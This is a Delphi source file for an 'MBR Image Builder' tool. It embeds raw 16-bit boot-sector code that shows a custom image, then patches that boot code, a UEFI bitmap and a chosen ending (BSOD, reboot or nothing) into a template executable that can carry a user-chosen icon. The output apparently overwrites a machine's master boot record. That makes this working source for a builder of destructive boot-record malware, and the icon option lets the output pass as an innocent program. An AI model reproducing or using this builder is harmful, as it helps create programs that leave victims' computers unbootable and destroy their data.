unit MBR_Image_Builder;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Controls, ShellAPI, jpeg, Forms, StdCtrls,
  ComCtrls, Graphics, ExtCtrls, Buttons, Dialogs, Guide, TFlatComboBoxUnit, XiButton, TNTStdCtrls,
  TNTSysUtils, TNTDialogs, ZipForge, image2bin, PNGImage, MiniMod, acWorkRes, WinXP, Functions;

type
  TForm1 = class(TForm)
    Image1: TImage;
    Image2: TImage;
    Image3: TImage;
    Button1: TXiButton;
    Button2: TXiButton;
    Button3: TXiButton;
    Button4: TXiButton;
    Button5: TXiButton;
    Button6: TXiButton;
    Edit1: TTNTEdit;
    Bevel1: TBevel;
    StaticText1: TStaticText;
    ComboBox1: TFlatComboBox;
    OpenDialog1: TTNTOpenDialog;
    SaveDialog1: TTNTSaveDialog;
    Timer1: TTimer;
    Timer2: TTimer;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure ComboBox1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
  private
    { Private declarations }
  public
    { Public declarations }
  end;
  
const 
  MBRCode: array[0..511] of byte = (
	  $BB, $E0, $07, $8E, $C3, $8E, $DB, $B8, $16, $02, $B9, $02, $00, $B6, $00, $BB,
	  $00, $00, $CD, $13, $31, $C0, $89, $C3, $89, $C1, $89, $C2, $BE, $00, $00, $BF,
	  $00, $00, $AC, $81, $FE, $00, $00, $73, $31, $3C, $80, $73, $02, $EB, $0F, $24,
	  $7F, $88, $C1, $AC, $AA, $FE, $C9, $80, $F9, $FF, $75, $F7, $EB, $E4, $B4, $00,
	  $3C, $40, $72, $05, $24, $3F, $88, $C4, $AC, $89, $C1, $AD, $89, $F2, $89, $FE,
	  $29, $C6, $AC, $AA, $E2, $FC, $89, $D6, $EB, $C8, $B8, $13, $00, $CD, $10, $BB,
	  $E0, $07, $8E, $DB, $BE, $00, $00, $B4, $00, $AC, $BB, $00, $00, $89, $C1, $BA,
	  $C8, $03, $88, $D8, $EE, $43, $BA, $C9, $03, $AC, $EE, $AC, $EE, $AC, $EE, $E2,
	  $EE, $BB, $00, $A0, $8E, $C3, $BF, $00, $00, $B9, $00, $7D, $F3, $A5, $F4, $EB,
	  $FD, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
	  $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $55, $AA);

const
  MAXIMUM_IMAGE_SIZE = 100*1024;
  MAXIMUM_MBR_SIZE = 20*1024;
  DEFAULT_IMAGE_WIDTH = 320;
  DEFAULT_IMAGE_HEIGHT = 200;
  MBR_CODE_ADDRESS = $84D5C; //Hex: 313233343500000000
  UEFI_BMP_ADDRESS = $911FC; //Hex: 424D36EE
  ENDING_ADDRESS = $7FD28;   //Hex: 30000000FFFFFFFF0100000031000000FFFFFFFF0100000032000000FFFFFFFF0100000033

const
  COMP_SIZE_INDEX_1 = 32;
  COMP_SIZE_INDEX_2 = 37;
  COMP_SIZE_INDEX_3 = 101;

var
  MiniMODClass: TMiniMOD;
  CustomImage: TBitmap;
  Form1: TForm1;

implementation

{$R *.dfm}


procedure TForm1.Timer1Timer(Sender: TObject);
begin
  if Form1.AlphaBlendValue >= 254 then Timer1.Enabled := False else Form1.AlphaBlendValue := Form1.AlphaBlendValue + 5;
end;


procedure TForm1.Timer2Timer(Sender: TObject);
begin
  Timer1.Enabled := False;
  if Form1.AlphaBlendValue = 0 then Application.Terminate else Form1.AlphaBlendValue := Form1.AlphaBlendValue - 5;
end;


procedure TForm1.Button6Click(Sender: TObject);
begin
  ShellExecute(0, 'open', PChar('https://serbinskis.github.io/'), nil, nil, SW_SHOWMAXIMIZED);
end;


procedure TForm1.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  CanClose := False;
  Timer2.Enabled := True;
end;


procedure TForm1.FormShow(Sender: TObject);
var
  ResStream: TResourceStream;
  ArrayOfByte: array of byte;
begin
  ResStream := TResourceStream.Create(HInstance, 'Music', RT_RCDATA);
  SetLength(ArrayOfByte, ResStream.Size);
  ResStream.Read(ArrayOfByte[0], ResStream.Size);
  ResStream.Free;

  MiniMODClass := TMiniMOD.Create(44100, True, True);
  MiniMODClass.Load(ArrayOfByte, Length(ArrayOfByte));
  MiniMODClass.Play;

  StaticText1.SetFocus;

  Button3Click(nil);
  Button4Click(nil);
  Timer1.Enabled := True;
end;


procedure TForm1.ComboBox1Click(Sender: TObject);
begin
  StaticText1.SetFocus;
end;


procedure TForm1.Button1Click(Sender: TObject);
var
  MemoryStream: TMemoryStream;
  Icon: TIcon;
  Bitmap: TBitmap;
begin
  OpenDialog1.Filter := 'ICO (*.ico)|*.ico';
  if not OpenDialog1.Execute then Exit;
  if AnsiLowerCase(ExtractFileExt(OpenDialog1.FileName)) <> '.ico' then Exit;

  MemoryStream := TMemoryStream.Create;
  WriteFileToStream(MemoryStream, OpenDialog1.FileName);

  Icon := TIcon.Create;
  Icon.LoadFromStream(MemoryStream);
  MemoryStream.Free;

  Bitmap := TBitmap.Create;
  Bitmap.Width := Icon.Width;
  Bitmap.Height := Icon.Height;
  Bitmap.Canvas.Brush.Color := FLAT_STYLE_DOWN_COLOR;
  Bitmap.Canvas.FillRect(Rect(0, 0, Bitmap.Width, Bitmap.Height));
  Bitmap.Canvas.Draw(0, 0, Icon);
  ResizeBitmap(Bitmap, 32, 32);

  Image1.Canvas.Draw(16, 16, Bitmap);
  if Image1.Picture = nil then Exit;
  Edit1.Text := OpenDialog1.FileName;

  Icon.Free;
  Bitmap.Free;
end;


procedure TForm1.Button2Click(Sender: TObject);
var
  MemoryStream: TMemoryStream;
  Bitmap: TBitmap;
  PNGObject: TPNGObject;
begin
  OpenDialog1.Filter := 'PNG (*.png)|*.png';
  if not OpenDialog1.Execute then Exit;
  if AnsiLowerCase(ExtractFileExt(OpenDialog1.FileName)) <> '.png' then Exit;

  if GetFileSize(OpenDialog1.FileName) > MAXIMUM_IMAGE_SIZE then begin
    ShowMessage('Image is too large.' + #13#10 + 'Try to make image atleast 20 KB.');
    Form2.Show;
    Exit;
  end;

  MemoryStream := TMemoryStream.Create;
  WriteFileToStream(MemoryStream, OpenDialog1.FileName);

  PNGObject := TPNGObject.Create;
  PNGObject.LoadFromStream(MemoryStream);
  MemoryStream.Free;

  Bitmap := TBitmap.Create;
  png2bmp(PNGObject, Bitmap);
  PNGObject.Free;

  if (Bitmap.Width <> DEFAULT_IMAGE_WIDTH) or (Bitmap.Height <> DEFAULT_IMAGE_HEIGHT) then begin
    ResizeBitmap(Bitmap, DEFAULT_IMAGE_WIDTH, DEFAULT_IMAGE_HEIGHT);
  end;

  Image2.Picture.Assign(Bitmap);
  if Image2.Picture = nil then Exit;

  CustomImage := TBitmap.Create;
  CustomImage.Assign(Bitmap);
end;


procedure TForm1.Button3Click(Sender: TObject);
begin
  Image1.Canvas.Brush.Color := FLAT_STYLE_DOWN_COLOR;
  Image1.Canvas.FillRect(Rect(0, 0, Image1.Width, Image1.Height));

  Image1.Canvas.Pen.Color := clBlack;
  Image1.Canvas.Rectangle(0, 0, Image1.Width, Image1.Height);

  Edit1.Text := '';
end;


procedure TForm1.Button4Click(Sender: TObject);
begin
  Image2.Canvas.Brush.Color := clBlack;
  Image2.Canvas.FillRect(Rect(0, 0, Image2.Width, Image2.Height));

  if CustomImage <> nil then CustomImage := nil;
end;



procedure TForm1.Button5Click(Sender: TObject);
var
  hWindow: DWORD;
  MemoryStream: TMemoryStream;
  buttonSelected, i, x, y: Integer;
  hFile, nw: Cardinal;
  ArrayOfByte: array of byte;
  hProcess: THandle;
  Rect: TRect;
begin
  if CustomImage = nil then begin
    MessageDlg('Select image.', mtCustom, [mbOK], 0);
    Exit;
  end;

  //Select filename
  SaveDialog1.InitialDir := WideGetCurrentDir;
  SaveDialog1.DefaultExt := 'exe';
  if not SaveDialog1.Execute then Exit;

  //Disable form while processing image
  Form1.Enabled := False;

  //Convert image
  MemoryStream := TMemoryStream.Create;
  ConvertBmp2Bin(CustomImage, MemoryStream);

  //Compress image
  if not CompressBin(MemoryStream) or (MemoryStream.Size > MAXIMUM_MBR_SIZE-Length(MBRCode)) then begin
    ShowMessage('Failed to compress the image.');
    Form1.Enabled := True;
    Form2.ShowModal;
    Exit;
  end;

  //Save MBR and image to array of byte
  SetLength(ArrayOfByte, MAXIMUM_MBR_SIZE);
  Move(MBRCode[0], ArrayOfByte[0], Length(MBRCode));
  MemoryStream.Read(ArrayOfByte[Length(MBRCode)], MemoryStream.Size);

  //Overwrite size of compressed image
  ArrayOfByte[COMP_SIZE_INDEX_1] := Byte(MemoryStream.Size);
  ArrayOfByte[COMP_SIZE_INDEX_1+1] := Byte(MemoryStream.Size shr 8);
  ArrayOfByte[COMP_SIZE_INDEX_2] := Byte(MemoryStream.Size);
  ArrayOfByte[COMP_SIZE_INDEX_2+1] := Byte(MemoryStream.Size shr 8);
  ArrayOfByte[COMP_SIZE_INDEX_3] := Byte(MemoryStream.Size);
  ArrayOfByte[COMP_SIZE_INDEX_3+1] := Byte(MemoryStream.Size shr 8);
  MemoryStream.Free;

  //Extract QEMU
  with TZipForge.Create(nil) do begin
    OpenArchive(TResourceStream.Create(HInstance, 'QEMU', RT_RCDATA), False);
    BaseDir := GetEnvironmentVariable('TEMP');
    ExtractFiles('*.*');
    CloseArchive();
  end;

  //Save byte array to disk.img to test with QEMU
  SaveByteArray_var(ArrayOfByte, GetEnvironmentVariable('TEMP') + '\QEMU\disk.img');

  //Execute QEMU for image test
  hProcess := ExecuteProcess(GetEnvironmentVariable('TEMP') + '\QEMU\qemu.exe', '-fda ' + GetEnvironmentVariable('TEMP') + '\QEMU\disk.img', SW_HIDE);
  while FindWindow(nil, 'QEMU') = 0 do Wait(100);
  hWindow := FindWindow(nil, 'QEMU');
  GetWindowRect(hWindow, Rect);
  x := Round((GetSystemMetrics(SM_CXSCREEN) - (Rect.Right - Rect.Left))/2);
  y := Round((GetSystemMetrics(SM_CYSCREEN) - (Rect.Bottom - Rect.Top))/2);
  for i := 0 to 10 do SetWindowPos(hWindow, 0, x, y, 0, 0, SWP_NOSIZE); //Sometimes it fails to set position so I just spammed it.
  WaitForSingleObject(hProcess, INFINITE);
  DeleteDirectory(GetEnvironmentVariable('TEMP') + '\QEMU');

  //Ask for user if everything is fine
  buttonSelected := MessageDlg('Is the image okay?', mtCustom, [mbYes, mbNo], 0);
  if buttonSelected = mrNo then begin
    Form1.Enabled := True;
    Form2.ShowModal;
    Exit;
  end;

  //Save executable
  SaveResource(SaveDialog1.FileName, 'CustomMBR', RT_RCDATA);

  //Write MBR to executable
  hFile := CreateFileW(PWideChar(SaveDialog1.FileName), GENERIC_ALL, FILE_SHARE_WRITE or FILE_SHARE_READ, nil, OPEN_EXISTING, 0,0);
  Windows.SetFilePointer(hFile, MBR_CODE_ADDRESS, nil, FILE_BEGIN);
  WriteFile(hFile, ArrayOfByte[0], Length(ArrayOfByte), nw, nil);

  //Write UEFI BMP to executable
  Windows.SetFilePointer(hFile, UEFI_BMP_ADDRESS, nil, FILE_BEGIN);
  MemoryStream := TMemoryStream.Create;
  CustomImage.PixelFormat := pf24bit;
  CustomImage.SaveToStream(MemoryStream);
  WriteFile(hFile, MemoryStream.Memory^, MemoryStream.Size, nw, nil);
  MemoryStream.Free;

  //Ending
  SetLength(ArrayOfByte, 1);

  case ComboBox1.ItemIndex of
    0: ArrayOfByte[0] := Ord('1'); //BSOD
    1: ArrayOfByte[0] := Ord('2'); //Reboot
    2: ArrayOfByte[0] := Ord('3'); //Nothing
  end;

  Windows.SetFilePointer(hFile, ENDING_ADDRESS, nil, FILE_BEGIN);
  WriteFile(hFile, ArrayOfByte[0], Length(ArrayOfByte), nw, nil);
  CloseHandle(hFile);

  //Add icon to executable
  if (Edit1.Text <> '') then begin
    if not AddIconResource(SaveDialog1.FileName, Edit1.Text, '1') then ShowMessage('Failed to add icon!');
  end;

  WideShowMessage('File Created -> ' + SaveDialog1.FileName);
  Form1.Enabled := True;
end;

end.
